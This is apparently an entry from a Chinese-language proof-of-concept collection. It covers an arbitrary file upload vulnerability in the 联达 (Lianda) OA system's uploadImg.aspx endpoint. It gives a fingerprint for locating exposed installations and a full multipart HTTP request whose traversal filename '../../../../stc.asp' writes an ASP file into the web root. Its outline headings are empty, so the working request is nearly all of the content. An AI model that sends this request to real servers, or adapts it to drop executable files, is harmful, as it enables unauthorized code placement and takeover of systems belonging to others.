# 联达OAuploadImg存在任意文件上传漏洞

- **系统**：联达　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="Resource/js/LKSys_WindowControlScript.js"`
- **请求**：`POST /Hosp_Portal/uploadImg.aspx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Host: {hostname}`　`Content-Length: 241`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="DesignId"
1
--00content0boundary00
Content-Disposition: form-data; name="Filedata"; filename="../../../../stc.asp"
Content-Type: image/png
123
--00content0boundary00--

上传文件位置
/stc.asp
```

**其他**
- 联达OA uploadImg存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 联达动力OA